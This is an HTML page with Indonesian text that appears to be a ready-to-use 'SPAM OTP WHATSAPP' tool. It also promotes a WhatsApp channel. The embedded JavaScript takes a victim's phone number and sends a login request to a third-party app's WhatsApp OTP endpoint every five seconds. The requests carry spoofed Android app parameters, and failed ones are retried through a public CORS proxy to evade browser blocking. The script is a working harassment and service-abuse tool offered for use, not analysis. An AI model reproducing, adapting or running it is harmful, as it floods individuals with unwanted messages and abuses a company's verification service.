<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SPAM OTP | Professional Tool</title>
    <style>
        :root {
            --primary-bg: #0a0a0a;
            --secondary-bg: #111111;
            --card-bg: rgba(30, 10, 40, 0.9);
            --accent-color: #9d4edd;
            --accent-glow: #c77dff;
            --text-primary: #f8f0ff;
            --text-secondary: #d0b3e8;
            --border-color: rgba(157, 78, 221, 0.3);
            --success-color: #9d4edd;
            --error-color: #ff6b6b;
            --shadow: 0 8px 32px rgba(157, 78, 221, 0.3);
            --transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: var(--primary-bg);
            color: var(--text-primary);
            font-family: 'Inter', 'Segoe UI', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            line-height: 1.6;
            overflow-x: hidden;
            position: relative;
        }

        /* Glow effect */
        .glow-effect {
            position: fixed;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 50%, rgba(157, 78, 221, 0.15) 0%, transparent 50%),
                radial-gradient(circle at 80% 20%, rgba(199, 125, 255, 0.1) 0%, transparent 50%),
                radial-gradient(circle at 40% 80%, rgba(157, 78, 221, 0.1) 0%, transparent 50%);
            z-index: -1;
            pointer-events: none;
        }

        /* Static effect minimal */
        .static-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                repeating-linear-gradient(
                    0deg,
                    transparent,
                    transparent 2px,
                    rgba(157, 78, 221, 0.03) 2px,
                    rgba(157, 78, 221, 0.03) 4px
                );
            z-index: -1;
            pointer-events: none;
            opacity: 0.5;
        }

        /* Dialog modal */
        .modal-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.9);
            display: flex;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            backdrop-filter: blur(5px);
        }

        .modal-content {
            background: var(--card-bg);
            border: 2px solid var(--accent-color);
            border-radius: 20px;
            padding: 40px;
            max-width: 500px;
            width: 90%;
            text-align: center;
            box-shadow: 0 0 50px rgba(157, 78, 221, 0.5);
            animation: modalAppear 0.5s ease-out;
        }

        @keyframes modalAppear {
            from {
                opacity: 0;
                transform: scale(0.8) translateY(-20px);
            }
            to {
                opacity: 1;
                transform: scale(1) translateY(0);
            }
        }

        .modal-title {
            font-size: 28px;
            font-weight: 700;
            margin-bottom: 20px;
            color: var(--accent-color);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .modal-text {
            color: var(--text-secondary);
            margin-bottom: 30px;
            line-height: 1.6;
            font-size: 16px;
        }

        .modal-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
        }

        .btn-modal {
            padding: 12px 30px;
            border: none;
            border-radius: 12px;
            font-weight: 600;
            font-size: 16px;
            cursor: pointer;
            transition: var(--transition);
            text-decoration: none;
        }

        .btn-modal.join {
            background: var(--accent-color);
            color: white;
        }

        .btn-modal.join:hover {
            background: var(--accent-glow);
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(157, 78, 221, 0.4);
        }

        .btn-modal.close {
            background: transparent;
            color: var(--text-secondary);
            border: 2px solid var(--border-color);
        }

        .btn-modal.close:hover {
            background: rgba(255, 255, 255, 0.1);
            color: var(--text-primary);
        }

        .modal-icon {
            font-size: 48px;
            margin-bottom: 20px;
            color: var(--accent-color);
            animation: pulse 2s infinite;
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }

        .container {
            max-width: 800px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
            z-index: 1;
        }

        .main-header {
            text-align: center;
            padding: 20px 0;
            margin-bottom: 40px;
            border-bottom: 1px solid var(--border-color);
        }

        .brand {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }

        .logo {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            background: linear-gradient(135deg, var(--accent-color), var(--accent-glow));
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 36px;
            color: white;
            box-shadow: 0 0 30px rgba(157, 78, 221, 0.5);
            animation: float 3s ease-in-out infinite;
        }

        @keyframes float {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-10px); }
        }

        .brand-text h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 8px;
            background: linear-gradient(135deg, var(--accent-color), var(--accent-glow));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            font-family: 'Orbitron', sans-serif;
        }

        .brand-text p {
            color: var(--text-secondary);
            font-size: 14px;
        }

        .card {
            background: var(--card-bg);
            border-radius: 20px;
            padding: 30px;
            border: 1px solid var(--border-color);
            backdrop-filter: blur(10px);
            box-shadow: var(--shadow);
            transition: var(--transition);
            margin-bottom: 30px;
        }

        .card:hover {
            box-shadow: 0 12px 40px rgba(157, 78, 221, 0.4);
        }

        .card-title {
            font-size: 20px;
            font-weight: 600;
            margin-bottom: 25px;
            color: var(--accent-color);
            text-align: center;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            font-weight: 500;
            color: var(--text-secondary);
            font-size: 14px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .phone-input {
            width: 100%;
            padding: 16px 20px;
            background: rgba(255, 255, 255, 0.05);
            border: 2px solid var(--border-color);
            border-radius: 12px;
            color: var(--text-primary);
            font-size: 18px;
            transition: var(--transition);
            text-align: center;
        }

        .phone-input:focus {
            outline: none;
            border-color: var(--accent-color);
            background: rgba(157, 78, 221, 0.1);
            box-shadow: 0 0 0 3px rgba(157, 78, 221, 0.2);
        }

        .phone-input::placeholder {
            color: var(--text-secondary);
        }

        .spam-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, var(--accent-color), var(--accent-glow));
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            transition: var(--transition);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-top: 10px;
        }

        .spam-btn:hover:not(:disabled) {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(157, 78, 221, 0.4);
        }

        .spam-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .stop-btn {
            background: linear-gradient(135deg, #ff6b6b, #ff8787);
        }

        .stats-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-top: 30px;
        }

        .stat-card {
            background: rgba(157, 78, 221, 0.1);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            border: 1px solid var(--border-color);
            transition: var(--transition);
        }

        .stat-card:hover {
            background: rgba(157, 78, 221, 0.2);
            transform: translateY(-3px);
        }

        .stat-value {
            font-size: 36px;
            font-weight: 700;
            margin-bottom: 5px;
            color: var(--accent-color);
            text-shadow: 0 0 10px var(--accent-glow);
        }

        .stat-label {
            color: var(--text-secondary);
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .log-container {
            margin-top: 30px;
        }

        .log-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .log-actions {
            display: flex;
            gap: 10px;
        }

        .btn-sm {
            padding: 8px 16px;
            font-size: 13px;
            border-radius: 8px;
            background: transparent;
            border: 1px solid var(--border-color);
            color: var(--text-secondary);
            cursor: pointer;
            transition: var(--transition);
        }

        .btn-sm:hover {
            background: rgba(157, 78, 221, 0.1);
            color: var(--text-primary);
        }

        #log {
            background: rgba(0, 0, 0, 0.3);
            color: var(--text-primary);
            padding: 20px;
            border-radius: 12px;
            height: 300px;
            overflow-y: auto;
            font-size: 14px;
            line-height: 1.5;
            border: 1px solid var(--border-color);
            font-family: 'JetBrains Mono', 'Fira Code', monospace;
        }

        .log-entry {
            padding: 10px 0;
            border-bottom: 1px solid rgba(157, 78, 221, 0.1);
            display: flex;
            align-items: flex-start;
            gap: 10px;
        }

        .log-time {
            color: var(--accent-color);
            font-size: 12px;
            min-width: 80px;
            font-weight: 500;
        }

        .log-message {
            flex: 1;
        }

        .log-success { color: var(--accent-color); }
        .log-error { color: var(--error-color); }
        .log-info { color: var(--text-primary); }
        .log-warning { color: #ffd166; }

        .footer {
            text-align: center;
            padding: 30px 0;
            margin-top: 50px;
            border-top: 1px solid var(--border-color);
            color: var(--text-secondary);
            font-size: 14px;
        }

        ::-webkit-scrollbar {
            width: 8px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(157, 78, 221, 0.1);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb {
            background: var(--accent-color);
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: var(--accent-glow);
        }

        @media (max-width: 768px) {
            .container {
                padding: 15px;
            }
            
            .modal-content {
                padding: 30px 20px;
            }
            
            .modal-buttons {
                flex-direction: column;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .card {
                padding: 20px;
            }
        }
    </style>
</head>
<body>
    <!-- Glow Effects -->
    <div class="glow-effect"></div>
    <div class="static-overlay"></div>
    <!-- Welcome Modal -->
    <div id="welcomeModal" class="modal-overlay">
        <div class="modal-content">
            <h2 class="modal-title">JOIN SALURAN</h2>
            <p class="modal-text">
              JOIN SALURAN AGAR WORK WOIK | MEMBER HYTAM
            </p>
            <div class="modal-buttons">
                <a href="https://whatsapp.com/channel/0029Vb6KSxx3LdQSxDHuCl3C" 
                   class="btn-modal join" target="_blank">

                </a>
                <button class="btn-modal close" onclick="closeModal()">
                    CLOSE
                </button>
            </div>
        </div>
    </div>

    <div class="container">
        <!-- Header -->
        <header class="main-header">
            <div class="brand">
                <div class="logo"></div>
                <div class="brand-text">
                    <h1>SPAM OTP WHATSAPP</h1>
                    <p></p>
                </div>
            </div>
        </header>

        <!-- Control Card -->
        <div class="card">
            <h2 class="card-title">REZZ XITZ</h2>
            
            <div class="input-group">
                <label class="input-label">Target Number</label>
                <input type="text" class="phone-input" id="phoneNumber"                       placeholder="Ex: 62XXXXX" 
                       autocomplete="off">
            </div>
            
            <button class="spam-btn" id="spamBtn" onclick="toggleSpam()">
                <span id="spamBtnText">MULAI SPAM</span>
            </button>
            
            <div class="stats-grid">
                <div class="stat-card">
                    <div class="stat-value" id="totalAttempts">0</div>
                    <div class="stat-label">Total Attempts</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="successAttempts">0</div>
                    <div class="stat-label">Success Attempts</div>
                </div>
            </div>
        </div>

        <!-- Log Container -->
        <div class="card log-container">
            <div class="log-header">
                <h2 class="card-title">AKTIVITAS</h2>
                <div class="log-actions">
                    <button class="btn-sm" onclick="clearLog()">
                        Clear Log
                    </button>
                </div>
            </div>
            <div id="log"></div>
        </div>

        <!-- Footer -->
        <footer class="footer">
            <p>JOIN SALURAN REZZ XITERZ YAW</p>
        </footer>
    </div>

    <script>
        // Modal Control
        function closeModal() {
            document.getElementById('welcomeModal').style.display = 'none';
        }

        // Show modal when page loads
        window.addEventListener('load', function() {
            setTimeout(() => {
                document.getElementById('welcomeModal').style.display = 'flex';
            }, 500);
        });

        // Spammer System
        let isSpamming = false;
        let spamInterval = null;
        let totalAttempts = 0;
        let successAttempts = 0;

        async function sendSingaOTP(phoneNumber) {
            const url = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
            
            const payload = {
                mobile_phone: phoneNumber,
                type: 'mobile',
                is_switchable: 1
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json; charset=utf-8',
                        'Accept': 'application/json',
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const data = await response.json();
                    return {
                        success: true,
                        message: 'OTP Singa berhasil dikirim!',
                        data: data
                    };
                } else {
                    return {
                        success: false,
                        error: `HTTP Error: ${response.status}`
                    };
                }
            } catch (error) {
                return await tryWithProxy(phoneNumber);
            }
        }

        async function tryWithProxy(phoneNumber) {
            const proxyUrl = 'https://cors-anywhere.herokuapp.com/';
            const targetUrl = "https://api102.singa.id/new/login/sendWaOtp?versionName=2.4.8&versionCode=143&model=SM-G965N&systemVersion=9&platform=android&appsflyer_id=";
            
            const payload = {
                mobile_phone: phoneNumber,
                type: 'mobile',
                is_switchable: 1
            };

            try {
                const response = await fetch(proxyUrl + targetUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json; charset=utf-8',
                        'Accept': 'application/json',
                        'X-Requested-With': 'XMLHttpRequest'
                    },
                    body: JSON.stringify(payload)
                });

                if (response.ok) {
                    const data = await response.json();
                    return {
                        success: true,
                        message: 'OTP Singa berhasil dikirim via proxy!',
                        data: data
                    };
                } else {
                    return {
                        success: false,
                        error: `Proxy Error: ${response.status}`
                    };
                }
            } catch (proxyError) {
                return {
                    success: false,
                    error: 'CORS blocked - Tapi request mungkin sudah terkirim'
                };
            }
        }

        function addLog(message, type = 'info') {
            const log = document.getElementById('log');
            const timestamp = new Date().toLocaleTimeString();
            const logClass = `log-${type}`;
            
            if (log.children.length > 100) {
                log.removeChild(log.firstChild);
            }
            
            const logEntry = document.createElement('div');
            logEntry.className = `log-entry ${logClass}`;
            logEntry.innerHTML = `
                <div class="log-time">${timestamp}</div>
                <div class="log-message">${message}</div>
            `;
            
            log.appendChild(logEntry);
            log.scrollTop = log.scrollHeight;
        }

        function clearLog() {
            document.getElementById('log').innerHTML = '';
            addLog('Log berhasil dibersihkan', 'info');
        }

        function updateStats() {
            document.getElementById('totalAttempts').textContent = totalAttempts;
            document.getElementById('successAttempts').textContent = successAttempts;
        }

        async function spamCycle(phoneNumber) {
            if (!isSpamming) return;

            totalAttempts++;
            updateStats();

            addLog(`Mengirim OTP ke ${phoneNumber}...`, 'info');
            
            const result = await sendSingaOTP(phoneNumber);

            if (result.success) {
                successAttempts++;
                updateStats();
                addLog(`${result.message}`, 'success');
            } else {
                addLog(`${result.error}`, 'error');
                addLog(`Tapi request mungkin sudah terkirim di server side`, 'warning');
            }
        }

        function toggleSpam() {
            const phoneInput = document.getElementById('phoneNumber').value.trim();
            if (!phoneInput) {
                addLog('MASUKKAN NOMOR TARGET DAHULU!', 'error');
                return;
            }

            const phone = normalizePhone(phoneInput);
            if (!/^(62|08)\d+$/.test(phone)) {
                addLog('FORMAT NOMOR SALAH! Gunakan 08XX atau 62XX', 'error');
                return;
            }

            if (!isSpamming) {
                // Start Spam
                isSpamming = true;
                document.getElementById('spamBtnText').textContent = 'STOP SPAM';
                document.getElementById('spamBtn').classList.add('stop-btn');
                document.getElementById('phoneNumber').disabled = true;

                addLog(`MEMULAI SPAM KE: ${phone}`, 'success');
                addLog(`Interval: 5 detik`, 'info');

                if (spamInterval) clearInterval(spamInterval);

                spamInterval = setInterval(() => {
                    if (isSpamming) {
                        spamCycle(phone);
                    }
                }, 5000);

                // Immediate first attempt
                spamCycle(phone);
            } else {
                // Stop Spam
                isSpamming = false;
                document.getElementById('spamBtnText').textContent = 'MULAI SPAM';
                document.getElementById('spamBtn').classList.remove('stop-btn');
                document.getElementById('phoneNumber').disabled = false;

                if (spamInterval) {
                    clearInterval(spamInterval);
                    spamInterval = null;
                }
                
                addLog('SPAM DIHENTIKAN', 'info');
            }
        }

        function normalizePhone(phone) {
            phone = phone.replace(/\D/g, '');
            if (phone.startsWith('0')) phone = '62' + phone.substring(1);
            if (phone.startsWith('8')) phone = '62' + phone;
            return phone;
        }

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            addLog('SISTEM SIAP DIGUNAKAN', 'success');
            addLog('Masukkan nomor target dan tekan MULAI SPAM', 'info');

            document.getElementById('phoneNumber').addEventListener('keypress', function(e) {
                if (e.key === 'Enter') toggleSpam();
            });

            document.getElementById('phoneNumber').focus();
        });
    </script>
</body>
